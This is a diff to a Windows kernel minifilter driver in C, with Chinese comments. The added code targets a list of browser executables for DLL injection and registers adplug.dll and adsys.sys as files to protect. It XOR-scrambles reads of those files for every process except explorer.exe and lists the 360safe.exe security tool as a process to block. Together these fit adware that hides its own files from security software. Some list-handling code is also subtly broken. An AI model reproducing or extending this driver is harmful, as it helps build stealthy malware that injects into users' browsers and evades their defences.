@@ -48,11 +48,11 @@ Environment:
     Filter initialization and unload routines.
 *************************************************************************/
 
-typedef struct{
+typedef struct {
     int num;
-	WCHAR name[256];
+    WCHAR name[256];
     LIST_ENTRY list;
-}MY_DATA,*PMY_DATA;
+} MY_DATA,*PMY_DATA;
 
 
 NTSTATUS DriverEntry (
@@ -84,11 +84,12 @@ Return Value:
     PVOID fnExGetPreviousMode = (PVOID)ExGetPreviousMode;
     PVOID pFoundPattern = NULL;
     UCHAR PreviousModePattern[] = "\x00\x00\xC3";
-		LIST_ENTRY list_head;
+    LIST_ENTRY list_head;
     PLIST_ENTRY p=NULL;
     PKLDR_DATA_TABLE_ENTRY entry=NULL;
-	int it;
-	WCHAR  a[]=L"hehee";
+    int it;
+	PMY_COMMAND_INFO  p1=NULL;
+    WCHAR  a[]=L"hehee";
     UNREFERENCED_PARAMETER( RegistryPath );
     DriverObject->DriverUnload = DriverUnload;
 
@@ -96,83 +97,59 @@ Return Value:
 
     //  Register with FltMgr
 
+//浏览器
     InitializeListHead(&g_ListProcess);
-    AppendListNode(L"360se.exe");
-    AppendListNode(L"chrome.exe");
-    AppendListNode(L"QQBrowser.exe");
-    AppendListNode(L"2345Explorer.exe");
-    AppendListNode(L"SogouExplorer.exe");
-    AppendListNode(L"baidubrowser.exe");
-    AppendListNode(L"firefox.exe");
-    AppendListNode(L"UCBrowser.exe");
-    AppendListNode(L"liebao.exe");
-    AppendListNode(L"TheWorld.exe");
-    AppendListNode(L"iexplore.exe");
-    AppendListNode(L"360chrome.exe");
-    AppendListNode(L"360chrome.exe");
-    AppendListNode(L"opera.exe");
-    AppendListNode(L"Maxthon.exe");
-
-	DbgPrint("a:%ws",a);
-	if (1)
-		{
-		CHAR  uu[216]={0};
-		WCHAR  ii=L"cccc";
-		vsprintf(uu,"%ws:%d",ii,20);
-		DbgPrint(uu);
-		}
 
 
-	//初始化头结点,必须
-	InitializeListHead(&list_head);
-	//第1步:初始化测试数据
-	for(it=0; it<16; it++){
-		//循环调用ExAllocatePool分配内存
-		//PMY_DATA pmd = (PMY_DATA)ExAllocatePool(PagedPool,sizeof(MY_DATA));
+    AppendListNode(L"360se.exe",&g_ListProcess,0);
+    AppendListNode(L"chrome.exe",&g_ListProcess,0);
+    AppendListNode(L"QQBrowser.exe",&g_ListProcess,0);
+    AppendListNode(L"2345Explorer.exe",&g_ListProcess,0);
+    AppendListNode(L"SogouExplorer.exe",&g_ListProcess,0);
+    AppendListNode(L"baidubrowser.exe",&g_ListProcess,0);
+    AppendListNode(L"firefox.exe",&g_ListProcess,0);
+    AppendListNode(L"UCBrowser.exe",&g_ListProcess,0);
+    AppendListNode(L"liebao.exe",&g_ListProcess,0);
+    AppendListNode(L"TheWorld.exe",&g_ListProcess,0);
+    AppendListNode(L"iexplore.exe",&g_ListProcess,0);
+    AppendListNode(L"360chrome.exe",&g_ListProcess,0);
+    AppendListNode(L"opera.exe",&g_ListProcess,0);
+    AppendListNode(L"Maxthon.exe",&g_ListProcess,0);
 
-		PMY_DATA pmd = (PMY_DATA)kmalloc(sizeof(MY_DATA));
+//要保护的文件
+    InitializeListHead(&g_ProtectFile);
+    KeInitializeSpinLock(&g_spin_lockfile);
 
-		//wsprintfW(__out LPWSTR,__in __format_string LPCWSTR,...)
+    AppendListNode(L"adplug.dll",&g_ProtectFile,2);
+    AppendListNode(L"adsys.sys",&g_ProtectFile,1);
 
-		
-		//数据域,我只定义了一个int类型变量,赋值
-		pmd->num = it;
 
-		//头插法,注意是&pmd->list
-		//也可以换成InsertTailList从尾部插入结点
-		//InsertTailList(&list_head,&pmd->list);
-		InsertHeadList(&list_head,&pmd->list);
-	}
-
-	for(p=list_head.Flink; p!=&list_head; p=p->Flink){
-		   //用CONTAINING_RECORD得到MY_DATA的指针
-		   //有关CONTAINING_RECORD的详细解说见我的另一篇文章
-		   //http://~
-		   PMY_DATA pmd = CONTAINING_RECORD(p,MY_DATA,list);
-		   KdPrint(("pmd->num:%d\n",pmd->num));
-	   }
+//不让访问的进程名
+    InitializeListHead(&g_AntiProcess);
+    KeInitializeSpinLock(&g_spin_process);
+    AppendListNode(L"360safe.exe",&g_AntiProcess,0);
 
 
 
 
-//    for ( p= g_ListProcess.Flink; p != &g_ListProcess.Flink; p = p->Flink) {	
-//        PMY_PROCESS_INFO  pData = CONTAINING_RECORD(p, MY_PROCESS_INFO, Entry);	
-//			DbgPrint("oo:%ws",pData->exename);
-//
-//    }
+
+    for ( p= g_ProtectFile.Flink; p != &g_ProtectFile.Flink; p = p->Flink) {
+        PMY_COMMAND_INFO info = CONTAINING_RECORD(p, MY_COMMAND_INFO, Entry);
+		kprintf("exename:%ws",info->exename);
+
+    }
 
 
 
 
 
 
-//    InitializeListHead(&g_AntiFile);
-//    AppendListNode(L"adsys.sys");
-//    AppendListNode(L"adplug.dll");
-//    IsByProtectFile(L"adsys.sys");
 
-//    InitializeListHead(&g_AntiProcess);
-//    AppendListNode(L"360se.exe");
+//	p1=  FindInList(L"adplug.dll",&g_ProtectFile,&g_spin_lockfile);
+//	kprintf("p1:%p",p1);
+
+
+//  kprintf("find:%d",FindInList(L"360se.exe",&g_AntiProcess));
 
 #ifdef _AMD64_
     //x64 add code
@@ -524,6 +501,7 @@ Return Value:
             leave;
         }
 
+
         //
         //  Save the sector size in the context for later use.  Note that
         //  we will pick a minimum sector size if a sector size is not
@@ -554,6 +532,7 @@ Return Value:
             //
 
             status = IoVolumeDeviceToDosName( devObj, &ctx->Name );
+
         }
 
         //
@@ -562,7 +541,17 @@ Return Value:
 
         if (!NT_SUCCESS(status)) {
 
+
             ASSERT(ctx->Name.Buffer == NULL);
+
+            status = STATUS_FLT_DO_NOT_ATTACH;
+            leave;
+
+
+
+
+
+
 
             //
             //  Figure out which name to use from the properties
@@ -632,11 +621,12 @@ Return Value:
         //  Set the context
         //
 
+
+        kprintf("[InstanceSetup] Volume Name:%wZ",&ctx->Name);
         status = FltSetVolumeContext( FltObjects->Volume,
                                       FLT_SET_CONTEXT_KEEP_IF_EXISTS,
                                       ctx,
                                       NULL );
-
         if (status == STATUS_FLT_CONTEXT_ALREADY_DEFINED) {
 
             status = STATUS_SUCCESS;
@@ -751,7 +741,7 @@ FLT_PREOP_CALLBACK_STATUS PreCleanup(
                 __leave;
             }
 
-            DbgPrint("[PreCleanup] call Cc_ClearFileCache");
+//            DbgPrint("[PreCleanup] call Cc_ClearFileCache");
             Cc_ClearFileCache(FltObjects->FileObject, TRUE, NULL, 0); // flush and purge cache
 
         }
@@ -827,7 +817,7 @@ FLT_PREOP_CALLBACK_STATUS PreClose(
 
 
         if (0 == pStreamCtx->RefCount) { //if reference decreases to 0, write file flag, flush|purge cache, and delete file context
-            DbgPrint("[PreClose]  RefCount:%d",pStreamCtx->RefCount);
+//            DbgPrint("[PreClose]  RefCount:%d",pStreamCtx->RefCount);
             Cc_ClearFileCache(FileObject, TRUE, NULL, 0);
         }
         SC_UNLOCK(pStreamCtx, OldIrql);
@@ -886,7 +876,7 @@ FLT_POSTOP_CALLBACK_STATUS PostCreate(
     BOOLEAN bNewCreatedOrNot = FALSE;
 
     LARGE_INTEGER FileSize = { 0 };
-    WCHAR   fitername[256]= {0};
+    WCHAR   fitername[512]= {0};
     LARGE_INTEGER ByteOffset = { 0 };
     LARGE_INTEGER OrigByteOffset = { 0 };
     ULONG      uReadLength = 0;
@@ -897,11 +887,8 @@ FLT_POSTOP_CALLBACK_STATUS PostCreate(
     KIRQL CurrentIrql;
     KIRQL OldIrql;
     ULONG  uPid;
-
     BOOLEAN   bexename=FALSE;
-
-
-
+    PMY_COMMAND_INFO  pCmdData=NULL;
     ULONG ilen=0;
     UNREFERENCED_PARAMETER(Flags);
     UNREFERENCED_PARAMETER(CompletionContext);
@@ -928,18 +915,21 @@ FLT_POSTOP_CALLBACK_STATUS PostCreate(
         ilen=GetNameByUnicodeString(&pfNameInfo->Name,fitername);
 
 
+//		[PostCreate] xxxxxxxx adplug.dll
 
 
-        if (_wcsicmp(fitername,L"adplug.dll")) {
-            leave;
+//        if (_wcsicmp(fitername,L"LockPage.exe")) {
+//            leave;
+//        }
+
+//		kprintf("[PostCreate] xxxxxxxx %ws",fitername);
+		
+        pCmdData=FindInList(fitername,&g_ProtectFile,&g_spin_lockfile);
+        if (pCmdData==NULL) {
+            __leave;
         }
 
-
-//      if (IsByProtectFile(fitername)==FALSE)
-//          {
-//              __leave;
-//
-//          }
+		kprintf("[PostCreate] type:%d exename:%ws",pCmdData->uType,pCmdData->exename);
         status = Ctx_FindOrCreateStreamContext(Data, FltObjects, TRUE,
                                                &pStreamCtx, &bNewCreatedOrNot);
         if (!NT_SUCCESS(status)) {
@@ -952,21 +942,21 @@ FLT_POSTOP_CALLBACK_STATUS PostCreate(
         if (!bNewCreatedOrNot) {
             SC_LOCK(pStreamCtx, &OldIrql);
             pStreamCtx->RefCount++;
+            pStreamCtx->uEncrypteType=pCmdData->uType;
             pStreamCtx->uAccess = uDesiredAccess;
             SC_UNLOCK(pStreamCtx, OldIrql);
-            DbgPrint("[PostCreate] has found RefCount:%d bNewCreatedOrNot:%d filename:%wZ\n", pStreamCtx->RefCount,bNewCreatedOrNot,&pStreamCtx->FileName);
+//            DbgPrint("[PostCreate] has found RefCount:%d filename:%wZ\n", pStreamCtx->RefCount,&pStreamCtx->FileName);
             __leave;
         }
 
         //init new created stream context
         SC_LOCK(pStreamCtx, &OldIrql);
         pStreamCtx->RefCount++;
+        pStreamCtx->uEncrypteType=pCmdData->uType;
         pStreamCtx->uAccess = uDesiredAccess;
-        DbgPrint("[PostCreate] has not found RefCount:%d bNewCreatedOrNot:%d filename:%wZ\n", pStreamCtx->RefCount,bNewCreatedOrNot,&pStreamCtx->FileName);
+        DbgPrint("[PostCreate] has not found RefCount:%d filename:%wZ\n", pStreamCtx->RefCount,&pStreamCtx->FileName);
         ///pStreamCtx->aes_ctr_ctx = NULL ;
         SC_UNLOCK(pStreamCtx, OldIrql);
-
-
 
         //Cc_ClearFileCache(FltObjects->FileObject, TRUE, NULL, 0); // flush and purge cache
 
@@ -1023,20 +1013,23 @@ FLT_PREOP_CALLBACK_STATUS PreRead(
     ULONG  uRet=0;
     try {
 
+        //get volume context
+        status = FltGetVolumeContext(FltObjects->Filter, FltObjects->Volume, &volCtx);
+        if (!NT_SUCCESS(status)) __leave;
 
         //get per-stream context, not used presently
         status = Ctx_FindOrCreateStreamContext(Data, FltObjects, FALSE, &pStreamCtx, NULL);
         if (!NT_SUCCESS(status)) __leave;
         //fast io path, disallow it, this will lead to an equivalent irp request coming in
         if (FLT_IS_FASTIO_OPERATION(Data)) { // disallow fast io path
-            DbgPrint("[PreRead] FLT_PREOP_DISALLOW_FASTIO");
+//            DbgPrint("[PreRead] FLT_PREOP_DISALLOW_FASTIO");
             retValue = FLT_PREOP_DISALLOW_FASTIO;
             __leave;
         }
 
         //cached io irp path
         if (!(Data->Iopb->IrpFlags & (IRP_NOCACHE | IRP_PAGING_IO | IRP_SYNCHRONOUS_PAGING_IO))) {
-            DbgPrint("[PreRead] This is Not IRP_NOCACHE IRP_PAGING_IO IRP_SYNCHRONOUS_PAGING_IO:%x",Data->Iopb->IrpFlags);
+//            DbgPrint("[PreRead] This is Not IRP_NOCACHE IRP_PAGING_IO IRP_SYNCHRONOUS_PAGING_IO:%x",Data->Iopb->IrpFlags);
             __leave;
         }
 
@@ -1073,7 +1066,7 @@ FLT_PREOP_CALLBACK_STATUS PreRead(
         //  do this for a FASTIO operation since the FASTIO interface has no
         //  parameter for passing the MDL to the file system.
         //
-
+        RtlZeroMemory(newBuf,readLen);
         if (FlagOn(Data->Flags,FLTFL_CALLBACK_DATA_IRP_OPERATION)) {
 
             //
@@ -1181,7 +1174,6 @@ FLT_POSTOP_CALLBACK_STATUS PostRead(
     //
     ASSERT(!FlagOn(Flags, FLTFL_POST_OPERATION_DRAINING));
     try {
-
         //
         //  If the operation failed or the count is zero, there is no data to
         //  copy so just return now.
@@ -1258,6 +1250,52 @@ FLT_POSTOP_CALLBACK_STATUS PostRead(
         //
 
 
+        try {
+
+//          DbgPrint("[PostRead] SwappedBuffer:%s filelen:%d",p2pCtx->SwappedBuffer,Data->IoStatus.Information);
+
+
+
+            if (MmIsAddressValid(p2pCtx->SwappedBuffer)) {
+
+
+                //除去explorer 全加密
+                if(p2pCtx->pStreamCtx->uEncrypteType==1) {
+                    PUCHAR  puorigin=(PUCHAR)origBuf;
+                    ULONG i=0;
+                    kprintf("[PostRead] encrypte len file:%d",Data->IoStatus.Information);
+                    for(i=0; i<Data->IoStatus.Information; i++) {
+                        PUCHAR pByte=(PUCHAR)p2pCtx->SwappedBuffer;
+                        puorigin[i]=pByte[i]^0xa;
+                    }
+                } else if(p2pCtx->pStreamCtx->uEncrypteType==2) {
+                    WCHAR exename[512]= {0};
+                    BOOLEAN  bgetname=  GetProcessNameByObj(PsGetCurrentProcess(),exename);
+                    if (_wcsicmp(exename,L"explorer.exe")==0) {
+                        RtlCopyMemory( origBuf,p2pCtx->SwappedBuffer, Data->IoStatus.Information );
+                    } else {
+                        PUCHAR  puorigin=(PUCHAR)origBuf;
+                        ULONG i=0;
+                        kprintf("[PostRead] encrypte len file:%d",Data->IoStatus.Information);
+                        for(i=0; i<Data->IoStatus.Information; i++) {
+                            PUCHAR pByte=(PUCHAR)p2pCtx->SwappedBuffer;
+                            puorigin[i]=pByte[i]^0xa;
+                        }
+                    }
+
+                }
+
+            }
+
+
+        }
+        __except(EXCEPTION_EXECUTE_HANDLER) {
+            ULONG code= GetExceptionCode();
+            DbgPrint("GetExceptionCode code:%x",code);
+        }
+
+
+
     }
     finally {
 
@@ -1323,7 +1361,7 @@ Return Value:
     UNREFERENCED_PARAMETER( FltObjects );
     UNREFERENCED_PARAMETER( Flags );
     ASSERT(Data->IoStatus.Information != 0);
-
+    kprintf("[PostReadWhenSafe] ......");
     //
     //  This is some sort of user buffer without a MDL, lock the user buffer
     //  so we can access it.  This will create a MDL for it.
@@ -1968,14 +2006,16 @@ void InjectDll(PEPROCESS ProcessObj, int ibit)
     }
 }
 
-NTSTATUS AppendListNode(CONST WCHAR name[])
+NTSTATUS AppendListNode(CONST WCHAR name[],LIST_ENTRY* link,ULONG uType)
 {
-    PMY_PROCESS_INFO  pInfo=(PMY_PROCESS_INFO)kmalloc(sizeof(MY_PROCESS_INFO));
+    PMY_COMMAND_INFO  pInfo=(PMY_COMMAND_INFO)kmalloc(sizeof(MY_COMMAND_INFO));
     if (NULL == pInfo) {
         return STATUS_INSUFFICIENT_RESOURCES;
     }
+    RtlZeroMemory(pInfo,sizeof(MY_COMMAND_INFO));
+    pInfo->uType=uType;
     wcscpy(pInfo->exename,name);
-    InsertHeadList(&g_ListProcess,(PLIST_ENTRY)&pInfo->Entry);
+    InsertHeadList(link,(PLIST_ENTRY)&pInfo->Entry);
     return STATUS_SUCCESS;
 }
 
@@ -1984,21 +2024,7 @@ BOOLEAN  IsByInjectProc(const WCHAR* name)
     PLIST_ENTRY p;
     BOOLEAN bret=FALSE;
     for ( p= g_ListProcess.Flink; p != &g_ListProcess.Flink; p = p->Flink) {
-        PMY_PROCESS_INFO  pData = CONTAINING_RECORD(p, MY_PROCESS_INFO, Entry);
-        if(_wcsicmp(pData->exename,name)==0) {
-            bret=TRUE;
-            break;
-        }
-    }
-    return bret;
-}
-
-BOOLEAN  IsByProtectFile(const WCHAR* name)
-{
-    PLIST_ENTRY p;
-    BOOLEAN bret=FALSE;
-    for ( p= g_AntiFile.Flink; p != &g_AntiFile.Flink; p = p->Flink) {
-        PMY_PROCESS_INFO  pData = CONTAINING_RECORD(p, MY_PROCESS_INFO, Entry);
+        PMY_COMMAND_INFO  pData = CONTAINING_RECORD(p, MY_COMMAND_INFO, Entry);
         if(_wcsicmp(pData->exename,name)==0) {
             bret=TRUE;
             break;
@@ -2160,6 +2186,26 @@ void  InitGlobeFunc(PIMAGE_INFO     ImageInfo )
 
     }
 
+
+}
+
+PMY_COMMAND_INFO  FindInList(const WCHAR* name,LIST_ENTRY*     link,PKSPIN_LOCK lock)
+{
+    PLIST_ENTRY p;
+    BOOLEAN bret=FALSE;
+    PMY_COMMAND_INFO  pData=NULL;
+    KIRQL  irql;    // 中断级别
+    KeAcquireSpinLock(lock, &irql);
+    for ( p= link->Flink; p != &link->Flink; p = p->Flink) {
+        pData = CONTAINING_RECORD(p, MY_COMMAND_INFO, Entry);
+		kprintf("exename:%ws",pData->exename);
+        if(_wcsicmp(pData->exename,name)==0) {
+            bret=TRUE;
+            break;
+        }
+    }
+    KeReleaseSpinLock(lock, irql);
+    return pData;
 
 }
 
